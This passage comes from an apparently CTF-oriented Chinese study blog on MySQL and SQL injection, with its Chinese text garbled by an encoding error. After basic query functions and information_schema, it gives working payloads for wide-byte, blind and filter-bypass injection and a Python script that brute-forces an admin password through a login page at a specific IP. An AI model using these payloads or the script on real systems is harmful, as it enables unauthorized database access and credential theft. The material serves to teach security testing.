class="line">        #| admin   | adpasswd    |</span><br><span class="line">        #| Dr.Who  | Doctor      |</span><br><span class="line">        #| Dr.What | Doctor      |</span><br><span class="line">        #| Dr.How  | Doctor      |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">select group_concat(uname separator &#39; , &#39;) from users group by passwd;</span><br><span class="line">        #+-------------------------------------+</span><br><span class="line">        #| group_concat(uname separator &#39; , &#39;) |</span><br><span class="line">        #+-------------------------------------+</span><br><span class="line">        #| 0test                               |</span><br><span class="line">        #| 233test                             |</span><br><span class="line">        #| admin                               |</span><br><span class="line">        #| Dr.Who , Dr.What , Dr.How           |</span><br><span class="line">        #| Kyriota                             |</span><br><span class="line">        #+-------------------------------------+</span><br><span class="line">select group_concat(uname separator &#39;-&#39;) from users;</span><br><span class="line">        #+---------------------------------------------------+</span><br><span class="line">        #| group_concat(uname separator &#39;-&#39;)                 |</span><br><span class="line">        #+---------------------------------------------------+</span><br><span class="line">        #| Kyriota-0test-233test-admin-Dr.Who-Dr.What-Dr.How |</span><br><span class="line">        #+---------------------------------------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>SELECT DISTINCT</code>ï¼šå»é™¤é‡å¤çš„æ•°æ®å†è¿”å›</p></li><li><p><code>WHERE</code>ï¼š</p><ul><li><code><></code>ï¼šä¸ç­‰äºï¼Œå¦‚ id&lt;&gt;4</li><li><code>BETWEEN ... AND ...</code>ï¼šåœ¨æŸèŒƒå›´å†…ï¼Œ å¦‚ id BETWEEN 4 AND 8</li><li><code>LIKE</code>ï¼šæ¨¡ç³ŠåŒ¹é…ï¼Œå¦‚ LIKE â€˜A%â€™ åˆ™è¡¨ç¤ºç­›é€‰å‡º Aå¼€å¤´çš„ï¼Œ%å¯ä»¥ä»£æ›¿ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</li><li><code>IN ( )</code>ï¼šåªåŒ¹é…ä¸æ‹¬å·ä¸­å¯¹åº”çš„å†…å®¹ï¼Œå¦‚ WHERE name IN (â€˜adminâ€™, â€˜guestâ€™)</li><li>NULLï¼šæ‰¾NULLæ—¶ä¸èƒ½WHERE col=NULLï¼Œåº”è¯¥æ˜¯WHERE col IS NULL</li></ul></li><li><p><code>AND / OR / NOT</code>ï¼š</p><ul><li><code>AND</code>ï¼š<code>WHERE Country='China' AND City='BeiJing'</code></li><li><code>OR</code>ï¼š<code>WHERE City='ShangHai' OR City='BeiJing'</code></li><li><code>NOT</code>ï¼š<code>WHERE NOT Country='China'</code></li></ul></li><li><p><code>CASE WHEN condition THEN statement ... END</code>ï¼šå’Œå¤§å¤šæ•°çš„caseè¯­å¥ä¸€æ ·ï¼Œä½†æ³¨æ„å®ƒç›¸å¯¹äºIF() â€» ä¸éœ€è¦é€—å·ä¸æ‹¬å· â€»</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select *,case when mark &gt;&#x3D;90 then &#39;A&#39; when mark &gt;&#x3D;60 then &#39;B&#39; else &#39;C&#39; end as level from grades order by mark desc;</span><br><span class="line">        #+------+------+-------+</span><br><span class="line">        #| Name | mark | level |</span><br><span class="line">        #+------+------+-------+</span><br><span class="line">        #| Tom  |   95 | A     |</span><br><span class="line">        #| Jill |   92 | A     |</span><br><span class="line">        #| Alan |   76 | B     |</span><br><span class="line">        #| Neo  |   59 | C     |</span><br><span class="line">        #+------+------+-------+</span><br></pre></td></tr></table></figure></li><li><p><code>IF(exp1,exp2,exp3)</code>ï¼šè‹¥exp1ï¼Œåˆ™exp2ï¼Œå¦åˆ™exp3</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select *,if(mark&gt;&#x3D;60, &#39;PASS&#39;, &#39;NOPE&#39;) from grades;</span><br><span class="line">        #+------+------+------------------------------+</span><br><span class="line">        #| Name | mark | if(mark&gt;&#x3D;60, &#39;PASS&#39;, &#39;NOPE&#39;) |</span><br><span class="line">        #+------+------+------------------------------+</span><br><span class="line">        #| Tom  |   95 | PASS                         |</span><br><span class="line">        #| Jill |   92 | PASS                         |</span><br><span class="line">        #| Neo  |   59 | NOPE                         |</span><br><span class="line">        #| Alan |   76 | PASS                         |</span><br><span class="line">        #+------+------+------------------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>SUBSTR / MID(str,start,length)</code>ï¼šstartä¸ºèµ·ç‚¹ï¼›lengthä¸ºæˆªå–é•¿åº¦ï¼Œlengthå¯é€‰æ‹©ä¸å¡«</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select substr(passwd,1,3) from users;</span><br><span class="line">        #+--------------------+</span><br><span class="line">        #| substr(passwd,1,3) |</span><br><span class="line">        #+--------------------+</span><br><span class="line">        #| kyr                |</span><br><span class="line">        #| 0te                |</span><br><span class="line">        #| 233                |</span><br><span class="line">        #| adp                |</span><br><span class="line">        #| Doc                |</span><br><span class="line">        #| Doc                |</span><br><span class="line">        #| Doc                |</span><br><span class="line">        #+--------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>SUBSTR / MID((col)from(start))</code>ï¼šè¿™ç§è¡¨è¾¾å¾ˆå…³é”®çš„ä¸€ç‚¹åœ¨äº â€» ä¸éœ€è¦é€—å· â€»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select mid((passwd)from(3)) from users;</span><br><span class="line">#+----------------------+</span><br><span class="line">#| mid((passwd)from(3)) |</span><br><span class="line">#+----------------------+</span><br><span class="line">#| riotayyds            |</span><br><span class="line">#| est                  |</span><br><span class="line">#| 3test                |</span><br><span class="line">#| passwd               |</span><br><span class="line">#| ctor                 |</span><br><span class="line">#| ctor                 |</span><br><span class="line">#| ctor                 |</span><br><span class="line">#+----------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>MD5()</code>ï¼šSQLä¹Ÿå†…ç½®äº† md5åŠ å¯†å‡½æ•°</p></li><li><p><code>SLEEP()</code>ï¼šå»¶è¿Ÿå‡½æ•°ï¼Œå•ä½ä¸ºç§’</p></li></ul><h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a><big>information_schema</big></h2><p>ä¿¡æ¯æ•°æ®åº“ï¼Œä¿å­˜ç€å…³äºmysqlæœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ï¼Œè¯¥æ•°æ®åº“ä¸­åˆæœ‰å‡ ä¸ªé‡è¦çš„æ•°æ®è¡¨ï¼Œè€Œå½“éœ€è¦è·¨æ•°æ®åº“è®¿é—®æ—¶ï¼Œåˆ™ä¸ç±»æˆå‘˜çš„è®¿é—®ç›¸ä¼¼ï¼Œå¦‚å¯¹äºCOLUMNSï¼šinformation_schema.COLUMNS</p><ul><li><p>SCHEMATAï¼šæä¾›äº†å½“å‰mysqlå®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯</p><ul><li>SCHEMA_NAMEè¿™ä¸€åˆ—è®°å½•ç€æ‰€æœ‰æ•°æ®åº“å</li></ul></li><li><p>TABLESï¼šæä¾›äº†å½“å‰æ•°æ®åº“ä¸­çš„è¡¨çš„ä¿¡æ¯ï¼Œè¡¨ç±»å‹ï¼Œè¡¨å¼•æ“ï¼Œæ‰€å±çš„æ•°æ®åº“ï¼Œåˆ›å»ºæ—¶é—´ç­‰ä¿¡æ¯</p><ul><li>TABLE_NAMEï¼šæ•°æ®è¡¨å</li><li>TABLE_SCHEMAï¼šè¡¨å¯¹åº”çš„æ•°æ®åº“å</li></ul></li><li><p>COLUMNSï¼šæä¾›äº†è¡¨ä¸­åˆ—çš„ä¿¡æ¯ï¼Œè¯¦ç»†è¡¨è¿°æ‰€æœ‰åˆ—çš„ä¿¡æ¯</p><ul><li><p>TABLE_SCHEMAï¼šæ•°æ®åº“å</p></li><li><p>TABLE_NAMEï¼šè¡¨å</p></li><li><p>COLUMN_NAMEï¼šåˆ—å</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select * from columns where table_name&#x3D;&#39;users&#39;;</span><br><span class="line">        #+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+--------------------+-------------+------------+-------+---------------------------------+----------------+-----------------------+--------+</span><br><span class="line">        #| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME | COLUMN_NAME         | ORDINAL_POSITION | COLUMN_DEFAULT | IS_NULLABLE | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH | CHARACTER_OCTET_LENGTH | NUMERIC_PRECISION | NUMERIC_SCALE | DATETIME_PRECISION | CHARACTER_SET_NAME | COLLATION_NAME     | COLUMN_TYPE | COLUMN_KEY | EXTRA | PRIVILEGES                      | COLUMN_COMMENT | GENERATION_EXPRESSION | SRS_ID |</span><br><span class="line">        #+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+--------------------+-------------+------------+-------+---------------------------------+----------------+-----------------------+--------+</span><br><span class="line">        #| def           | performance_schema | users      | CURRENT_CONNECTIONS |                2 | NULL           | NO          | bigint    |                     NULL |                   NULL |                19 |             0 |               NULL | NULL               | NULL               | bigint      |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | performance_schema | users      | TOTAL_CONNECTIONS   |                3 | NULL           | NO          | bigint    |                     NULL |                   NULL |                19 |             0 |               NULL | NULL               | NULL               | bigint      |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | performance_schema | users      | USER                |                1 | NULL           | YES         | char      |                       32 |                    128 |              NULL |          NULL |               NULL | utf8mb4            | utf8mb4_bin        | char(32)    | UNI        |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | test               | users      | passwd              |                2 | NULL           | YES         | varchar   |                       12 |                     48 |              NULL |          NULL |               NULL | utf8mb4            | utf8mb4_0900_ai_ci | varchar(12) |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | test               | users      | uname               |                1 | NULL           | YES         | varchar   |                       10 |                     40 |              NULL |          NULL |               NULL | utf8mb4            | utf8mb4_0900_ai_ci | varchar(10) |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+--------------------+-------------+------------+-------+---------------------------------+----------------+-----------------------+--------+</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="åŸºäºçº¦æŸçš„æ”»å‡»"><a href="#åŸºäºçº¦æŸçš„æ”»å‡»" class="headerlink" title="åŸºäºçº¦æŸçš„æ”»å‡»"></a><big>åŸºäºçº¦æŸçš„æ”»å‡»</big></h2><blockquote>åœ¨MySQLçš„é…ç½®é€‰é¡¹ä¸­ï¼Œæœ‰ä¸€ä¸ªsql_modeé€‰é¡¹ã€‚å½“MySQLçš„sql_modeè®¾ç½®ä¸ºdefaultæ—¶ï¼Œå³æ²¡æœ‰å¼€å¯STRICT_ALL_TABLESé€‰é¡¹æ—¶ï¼ŒMySQLå¯¹äºç”¨æˆ·æ’å…¥çš„è¶…é•¿å€¼åªä¼šæç¤ºwarningï¼Œè€Œä¸æ˜¯errorï¼ˆå¦‚æœæ˜¯erroråˆ™æ’å…¥ä¸æˆåŠŸï¼‰ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´å‘ç”Ÿä¸€äº›â€œæˆªæ–­â€é—®é¢˜ â€”â€”â€”â€” é“å“¥</blockquote><p>å› ä¸ºåœ¨sqlæ‰§è¡Œå­—ç¬¦ä¸²å¤„ç†æ—¶ï¼Œå­—ç¬¦ä¸²æœ«å°¾çš„ç©ºæ ¼ç¬¦å°†ä¼šè¢«åˆ é™¤ï¼Œå¯¼è‡´ â€œadminâ€ä¸ â€œadmin     â€æ˜¯ç­‰æ•ˆçš„ã€‚å½“ä½¿ç”¨å¦‚ â€œadmin                       xâ€è¿™æ ·çš„è¶…é•¿å­—ç¬¦ä¸²ï¼Œæˆ–æœ«å°¾ç›´æ¥æ˜¯ç©ºæ ¼çš„â€œadmin   â€æ³¨å†ŒæˆåŠŸï¼Œå‰è€…ä¼šå› ä¸ºæˆªæ–­ï¼Œå’Œåè€…ä¸€æ ·å¯ä»¥è¾¾åˆ°è¶Šæƒè·å–æƒé™</p><h2 id="SQLæŸ¥è¯¢ä¸æ¯”è¾ƒ"><a href="#SQLæŸ¥è¯¢ä¸æ¯”è¾ƒ" class="headerlink" title="SQLæŸ¥è¯¢ä¸æ¯”è¾ƒ"></a><big>SQLæŸ¥è¯¢ä¸æ¯”è¾ƒ</big></h2><p>strä¸intçš„æ¯”è¾ƒï¼šä¸PHPä¸€æ ·ï¼Œéæ•°å­—å¼€å¤´çš„strè¢«å½“æˆ 0ï¼Œæ•°å­—å¼€å¤´çš„ä¼šè¢«å½“æˆé‚£ä¸ªå¼€å¤´çš„æ•°å­—ï¼Œè¿™ä½¿å¾—åœ¨è¾“å…¥ user=0æˆ– user=â€™â€™æ—¶è¿”å›æ‰€æœ‰é 0å¼€å¤´çš„ user</p><p>SQLè¿ç­‰ï¼šé˜´é—´è¯­æ³•ï¼Œå¦‚ where user=â€™adminâ€™=â€™adminâ€™=1ï¼Œå¯ç†è§£ä¸ºåšå¼‚æˆ–å–å (åŒæˆ–)è¿ç®—</p><blockquote>æŸ¥ç¬¬ä¸€ä¸ªadminï¼ŒæŸ¥è¯¢å¯¹è±¡æ˜¯åŸæœ¬çš„æ•°æ®è¡¨ï¼Œç»“æœä¸º{adminï¼š1ï¼Œå…¶ä»–ï¼š0}    æ­¤æ—¶è¿˜æ²¡æœ‰åˆ°è¿”å›adminå¹¶æ‰“å°å‡ºæ¥çš„æ—¶å€™ï¼Œå› ä¸ºåé¢çš„è¿ç­‰è¿˜æ²¡æœ‰æ¯”è¾ƒå®Œ</blockquote><blockquote>æŸ¥ç¬¬äºŒä¸ªadminï¼ŒæŸ¥è¯¢å¯¹è±¡æ˜¯1å’Œ0ï¼Œå› ä¸ºadminéæ•°å­—å¼€å¤´ï¼Œæ­¤æ—¶å’Œintæ¯”è¾ƒï¼Œè½¬æ¢æˆ0ï¼Œå’Œä¸Šæ¬¡éadminçš„å­—æ®µçš„æŸ¥è¯¢ç»“æœåŒ¹é…ï¼Œæ‰€ä»¥è¿™æ¬¡æ¯”è¾ƒç»“æœä¸º{adminï¼š0ï¼Œå…¶ä»–ï¼š1}</blockquote><blockquote>ç¬¬ä¸‰æ¬¡æŸ¥1ï¼Œæ˜¾ç„¶åŒ¹é…åˆ°å…¶ä»–ï¼Œæ•…æœ€ç»ˆè¿”å›ä¸ºå¤„adminå¤–çš„æ‰€æœ‰æˆå‘˜</blockquote><h2 id="ä¸‡-èƒ½-é’¥-åŒ™"><a href="#ä¸‡-èƒ½-é’¥-åŒ™" class="headerlink" title="ä¸‡ èƒ½ é’¥ åŒ™"></a><big>ä¸‡ èƒ½ é’¥ åŒ™</big></h2><p>æœ€åŸºç¡€çš„SQLæ³¨å…¥ï¼šadminâ€™ or â€˜1â€™=â€™1</p><h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a><big>å®½å­—èŠ‚æ³¨å…¥</big></h2><p align='right'><small>ç‰¹å¾ï¼šgbkç­‰å®½å­—èŠ‚ç¼–ç </small></p><p>é€šå¸¸çš„åœ¨sqlè¯­å¥å‰é¢ä½¿ç”¨äº†ä¸€ä¸ªaddslashes()ï¼Œå°†$idçš„å€¼è½¬ä¹‰ã€‚è¿™æ˜¯é€šå¸¸å¯¹sqlæ³¨å…¥è¿›è¡Œçš„æ“ä½œï¼Œåªè¦æˆ‘ä»¬çš„è¾“å…¥å‚æ•°åœ¨å•å¼•å·ä¸­ï¼Œå°±é€ƒé€¸ä¸å‡ºå•å¼•å·çš„é™åˆ¶ï¼Œæ— æ³•æ³¨å…¥</p><p>å®½å­—èŠ‚æ³¨å…¥æ˜¯åˆ©ç”¨mysqlçš„ä¸€ä¸ªç‰¹æ€§ï¼Œmysqlåœ¨ä½¿ç”¨GBKç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—ï¼ˆå‰ææ˜¯å‰ä¸€ä¸ªASCIIç å¤§äº128ï¼Œè¿™æ ·æ‰èƒ½è¾¾åˆ°æ±‰å­—çš„èŒƒå›´ï¼Œå¦‚%dfä¹‹ç±»çš„ï¼‰</p><p>ç¤ºä¾‹payloadï¼š<code>/?id=hello%df' union select 'admin','pass'#</code></p><h2 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a><big>ç›²æ³¨</big></h2><p align='right'><small>SQLI-LAB</small></p><p>å¯¹æ— å›æ˜¾é¡µé¢çš„æ³¨å…¥å«åšç›²æ³¨ï¼Œå¤§å¤šæ•°æ—¶å€™éƒ½æ˜¯é‡è§çš„è¿™æ ·çš„é¡µé¢ï¼Œåˆ†ä¸ºå¸ƒå°”ç›²æ³¨å’Œæ—¶é—´ç›²æ³¨ï¼Œä½†æœ¬è´¨ä¸Šå·®åˆ«ä¸å¤§ã€‚åŸç†å¤§è‡´å¯ç†è§£ä¸ºä¸æ–­çŒœæµ‹å­—ç¬¦çš„è¿‡ç¨‹ï¼Œé€šè¿‡æ³¨å…¥åè¿”å›çš„ä¿¡æ¯åˆ¤æ–­çŒœå¯¹ä¸å¦ï¼Œæœ‰ç‚¹æš´åŠ›ç ´è§£çš„æ„æ€ã€‚ç”±äºç›²æ³¨çš„é‡å¤æ€§ï¼Œæ‰‹æ³¨åœ¨ç›²æ³¨ä¸­æœ€å¤šç”¨äºç›²æ³¨ç±»å‹çš„åˆ¤æ–­ï¼ŒçŒœæµ‹è¿‡ç¨‹åˆ™äº¤ç»™è„šæœ¬ï¼Œburpï¼Œsqlmapç­‰å®Œæˆ</p><p>é€šå¸¸ç›²æ³¨æ—¶å…ˆè·‘æ•°æ®åº“åçš„é•¿åº¦ï¼Œå†è·‘æ•°æ®åº“åï¼Œç„¶ååˆè·‘è¡¨åçš„é•¿åº¦â€¦å¦‚æœæœ‰éœ€è¦ç”šè‡³å¯çˆ†æ•´ä¸ªæ•°æ®åº“ï¼Œä¹Ÿå¯ä»¥ä¸è·‘é•¿åº¦è€Œç›´æ¥å¼€å§‹è·‘å†…å®¹ï¼Œå› ä¸ºçŸ¥é“é•¿åº¦çš„ä½œç”¨åªæ˜¯å¿ƒé‡Œæœ‰ä¸ªåº•ã€‚å¸ƒå°”ç›²æ³¨å’Œæ—¶é—´ç›²æ³¨çš„åŒºåˆ«å°±åªæ˜¯åœ¨äºè¿”å›ä¿¡æ¯ä¸åŒï¼Œå¸ƒå°”ç›²æ³¨é€šè¿‡è¿”å›ä¸¤ç§çŠ¶æ€ä¿¡æ¯åˆ¤æ–­ï¼Œæ—¶é—´ç›²æ³¨åˆ™æ ¹æ®å“åº”æ—¶é—´åˆ¤æ–­</p><ul><li><p>payloadæ„é€ ä¸ç¤ºä¾‹</p><p>æ„é€ payloadæ—¶ï¼Œåº”æ ¹æ®ç½‘é¡µå®ç°çš„åŠŸèƒ½è€ƒè™‘ä½¿ç”¨äº†ä»€ä¹ˆSQLæŸ¥è¯¢è¯­å¥ï¼Œè¿™æ ·æ‰èƒ½å‡†ç¡®çŸ¥é“éœ€è¦å¤šå°‘æ‹¬å·æˆ–å¼•å·æ¥é—­åˆè¯­å¥</p><ul><li><p>è¡¨é•¿ï¼ˆåŒ…å«åœ¨INSERT INTO â€¦ VALUE(input)ä¸­ï¼‰ï¼š<code>'and (case when (length((select group_concat(table_name separator '-') from information_schema.tables where table_schema=database()))=10) then sleep(5) else 1 end)) #</code></p><p>  å¯ä»¥å‘ç°ç»“å°¾å› ä¸ºè¦æ³¨é‡Šæ‰å¤šä½™çš„ <code>')</code> è€Œè¡¥äº†ä¸€ä¸ªåæ‹¬å·</p></li><li><p>è¡¨åï¼š<code>if(substr((select group_concat(table_name separator ',') from information_schema.tables where table_schema=database())Â  from %s for 1)='%s',sleep(5),1)</code></p></li><li><p>å­—æ®µåï¼š<code>ascii(mid((select group_concat(column_name separator '-') from information_schema.columns where table_name='è¡¨å') from(%i)))=%i</code></p></li></ul></li><li><p>e.g.å¸ƒå°”ç›²æ³¨çŒœadminå¯†ç </p><ul><li><p>å¦‚è¿”å›â€œç”¨æˆ·åä¸å­˜åœ¨â€ä¸â€œå¯†ç é”™è¯¯â€ä¸¤ç§ä¿¡æ¯çš„é¡µé¢ï¼Œå°±å¯ä»¥å°è¯•å¸ƒå°”ç›²æ³¨</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">url=<span class="string">&#x27;http://114.67.246.176:13058/login.php&#x27;</span><span class="comment">#æ³¨æ„æ˜¯ç™»å½•é¡µè€Œéindex</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):<span class="comment">#çŒœæµ‹æ˜¯MD5åŠ å¯†ï¼Œä¸º32ä½ï¼Œå…ˆè·‘33ä½è¯•è¯•</span></span><br><span class="line">    <span class="keyword">for</span> tar <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):<span class="comment">#32~128ä¸ºå¸¸ç”¨çš„96ä¸ªASCIIå­—ç¬¦</span></span><br><span class="line">        uname=<span class="string">&quot;admin&#x27;=&#x27;admin&#x27;=ascii(mid((passwd)from(%s)))-%s-&#x27;&quot;</span>%(i,tar)</span><br><span class="line">        data=&#123;<span class="string">&#x27;uname&#x27;</span>:uname,<span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;anything&#x27;</span>&#125;</span><br><span class="line">        response=requests.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> response:<span class="comment">#æŠ¥å¯†ç é”™è¯¯æ—¶è¯´æ˜tarçš„å€¼ä¸å¯†ç ç¬¬iä½å­—ç¬¦çš„ASCIIç›¸åŒ</span></span><br><span class="line">            result+=<span class="built_in">chr</span>(tar)</span><br><span class="line">            print(<span class="string">&quot;\r%s&quot;</span>%result,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li><li><p>ä¸Šè¿°è„šæœ¬ä¸æ˜¯ç»å¯¹çš„ï¼Œæœ‰çš„ç™»å½•é¡µå¯èƒ½å¯¹æŸäº›æ³¨å…¥æ–¹å¼è®¾ç½®äº†é’ˆå¯¹æ€§è¿‡æ»¤ï¼Œå…·ä½“çš„payloadæ„é€ è¿˜éœ€è¦å¯¹åº”å…·ä½“æƒ…å†µï¼Œæ­¤å¤„å†ä¸¾ä¸€ä¸ªâ€œ=â€è¢«è¿‡æ»¤çš„ä¾‹å­</p>  <center><code>"admin'^((ascii(mid((select(password)from(admin))from(%s))))<>%s)^1#"</code></center></li></ul></li></ul><h2 id="é¢„å¤„ç†è¯­å¥"><a href="#é¢„å¤„ç†è¯­å¥" class="headerlink" title="é¢„å¤„ç†è¯­å¥"></a><big>é¢„å¤„ç†è¯­å¥</big></h2><p>æ‰€è°“é¢„å¤„ç†æŒ‡çš„å°±æ˜¯å°†SQLè¯­å¥ä¸­çš„å…³é”®å­—(å¦‚ SELECTâ€¦FROMâ€¦)ä¸æ•°æ®(å¦‚å­—æ®µåï¼Œæ•°æ®è¡¨å)åˆ†ç¦»,ä½¿å¾—é’ˆå¯¹ä¸åŒæ•°æ®çš„ç›¸åŒSQLè¯­å¥çš„æ‰§è¡Œå¼€é”€æ›´å°ï¼ŒåŒæ—¶åˆå¯é˜²æ­¢SQLæ³¨å…¥çš„æ”»å‡»</p><p>ä¼ ç»Ÿæ–¹å¼çš„SQLè¯­å¥ï¼Œåœ¨æ‰§è¡Œæ—¶æ¯æ¡SQLéƒ½éœ€è¦ç»è¿‡åˆ†æã€ç¼–è¯‘å’Œä¼˜åŒ–çš„æ­¥éª¤ï¼›é¢„å¤„ç†æ–¹å¼åˆ™æ˜¯åˆ©ç”¨å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨çš„äºŒè¿›åˆ¶åè®®ï¼Œé¢„å…ˆç¼–è¯‘ä¸€æ¬¡å®¢æˆ·ç«¯å‘é€çš„SQLè¯­å¥æ¨¡æ¿,ç„¶åå†æ ¹æ®å®¢æˆ·ç«¯å‘é€ç»™æœåŠ¡å™¨ç›¸åº”æ•°é‡çš„å˜é‡è¿›è¡Œæ‰§è¡Œæ“ä½œï¼Œå¹¶æ—¦é’ˆå¯¹ä¸€æ¡SQLè¯­å¥æ¨¡æ¿å¯ä»¥æ‰§è¡Œå¤šæ¬¡,è¿˜æ— éœ€è€ƒè™‘æ•°æ®ä¸­å«æœ‰æœªè½¬ä¹‰çš„SQIå¼•å·å’Œåˆ†éš”ç¬¦å­—ç¬¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PREPARE stmt FROM &#39;SELECT * FROM user WHERE uname&#x3D;?&#39;;</span><br><span class="line">SET @uname&#x3D;&#39;admin&#39;;</span><br><span class="line">EXECUTE stmt USING @uname;</span><br><span class="line">DEALLOCATE &#x2F; DROP PREPARE stmt;</span><br></pre></td></tr></table></figure><p>ä»¥æ­¤ï¼Œå¯ä»¥åœ¨èƒ½å †å æ³¨å…¥æ—¶å€™ç»•è¿‡å¯¹SELECTç­‰å…³é”®å­—çš„è¿‡æ»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET @sqlvar&#x3D;CONCAT(&#39;SE&#39;,&#39;LECT * FROM user&#39;);</span><br><span class="line">PREPARE myquery FROM @sqlvar;</span><br><span class="line">EXECUTE myquery;</span><br></pre></td></tr></table></figure><h2 id="â€èŠ±å¼ç»•è¿‡â€"><a href="#â€èŠ±å¼ç»•è¿‡â€" class="headerlink" title="â€èŠ±å¼ç»•è¿‡â€"></a><big>â€èŠ±å¼ç»•è¿‡â€</big></h2><ul><li><p>åŒå†™å…³é”®å­—ï¼šæŸäº›ç®€å•çš„wafä¸­ï¼Œå°†å…³é”®å­—<code>select</code>ç­‰åªä½¿ç”¨<code>replace()</code>å‡½æ•°ç½®æ¢ä¸ºç©ºï¼Œè¿™æ—¶å€™å¯ä»¥ä½¿ç”¨åŒå†™å…³é”®å­—ç»•è¿‡ã€‚ä¾‹å¦‚<code>select</code>å˜æˆ<code>seleselectct</code>ï¼Œåœ¨ç»wafçš„å¤„ç†ä¹‹ååˆå˜æˆ<code>select</code>ï¼Œè¾¾åˆ°ç»•è¿‡çš„è¦æ±‚</p></li><li><p>è¿‡æ»¤selectï¼šå½“å­˜åœ¨å›æ˜¾æ—¶ï¼Œå¯ä»¥åŸºäºæŠ¥é”™æ³¨å…¥ã€‚å¸¸ç”¨å‡½æ•°ä¸ºä¸¤ä¸ªæ“ä½œXMLæ–‡æ¡£çš„å‡½æ•°</p><ul><li><code>extractvalue()</code>ï¼šå¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°<ul><li>paraï¼š(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„)</li></ul></li><li><code>updatexml()</code>ï¼šæ›´æ–°xmlæ–‡æ¡£<ul><li>paraï¼š(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„ï¼Œæ›´æ–°çš„å†…å®¹)</li></ul></li></ul><p>  